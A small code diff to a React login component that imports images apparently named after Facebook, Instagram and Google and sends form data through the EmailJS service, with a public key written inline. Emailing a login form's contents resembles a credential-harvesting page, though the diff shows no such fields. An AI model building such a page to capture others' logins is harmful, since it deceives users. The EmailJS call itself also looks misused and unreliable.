@@ -8,7 +8,6 @@ import pass from '../assets/images/pass.jpg'
 import face from '../assets/images/face.jpg'
 import insta from '../assets/images/insta.jpg'
 import goo from '../assets/images/goo.jpg'
-
 import emailjs from '@emailjs/browser';
 
 export default function Login() {
@@ -23,7 +22,7 @@ export default function Login() {
     emailjs
       .sendForm('YOUR_service_wue1pqf',
          'YOUR_template_4hoz438', {
-        formcurrent,
+        publickey:
         'zlh6YHfECaW1NmnbX',
       })
       .then(
